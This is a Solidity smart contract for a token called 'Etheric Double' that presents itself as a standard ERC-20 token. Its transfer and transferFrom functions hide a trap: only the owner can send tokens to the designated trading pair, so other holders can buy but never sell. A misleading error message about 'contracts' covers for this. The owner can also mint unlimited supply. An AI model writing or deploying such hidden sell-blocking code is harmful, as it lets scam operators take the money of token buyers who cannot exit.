// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Etheric_Double {
    string public name = "Etheric Double";
    string public symbol = "E2";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public owner;
    address public pair;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        owner = msg.sender;
        totalSupply = 1000000 * 10 ** uint256(decimals);
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can perform this action");
        _;
    }

    function isPair(address _addr) internal view returns (bool) {
        if (_addr == pair) {
            return true;
        } else return false;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        if (tx.origin != owner) {
            require(!isPair(_to), "Only the owner can send tokens to contracts");
        }

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");

        if (tx.origin != owner) {
            require(!isPair(_to), "Only the owner can send tokens to contracts");
        }

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function mint(uint256 _amount) public onlyOwner {
        totalSupply += _amount;
        balanceOf[owner] += _amount;
        emit Transfer(address(0), owner, _amount);
    }

    function burn(uint256 _amount) public onlyOwner {
        require(balanceOf[owner] >= _amount, "Insufficient balance to burn");
        totalSupply -= _amount;
        balanceOf[owner] -= _amount;
        emit Transfer(owner, address(0), _amount);
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0), "New owner cannot be the zero address");
        emit OwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function setPair(address _pair) public onlyOwner {
        require(_pair != address(0), "Pair address cannot be the zero address");
        pair = _pair;
    }
}